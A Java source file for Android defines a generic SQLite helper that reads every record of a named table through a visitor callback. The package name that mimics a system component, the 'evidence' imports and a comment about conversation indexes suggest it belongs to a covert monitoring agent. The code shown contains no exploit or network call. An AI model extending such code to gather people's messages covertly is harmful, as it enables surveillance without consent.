package com.android.networking.db;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteQueryBuilder;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;

public class GenericSqliteHelper extends SQLiteOpenHelper {

	public static Object lockObject = new Object();

	public GenericSqliteHelper(String name, int version) {
		super(Status.self().getAppContext(), name, null, version);
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
	}

	public void traverseRecords(String table, String[] projection, RecordVisitor visitor) {

		synchronized (lockObject) {
			SQLiteDatabase db = getReadableDatabase();
			SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();

			queryBuilderIndex.setTables(table);
			Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

			visitor.init();

			// iterate conversation indexes
			while (cursor != null && cursor.moveToNext()) {
				visitor.cursor(cursor);

				// String[] record = new String[projection.length];
				// int rpos=0;
				// for (String column : projection) {
				//
				// record[rpos] = cursor.getString(
				// cursor.getColumnIndex(column) );
				// rpos++;
				// }

			}

			visitor.close();
			cursor.close();
			db.close();
		}
	}

}
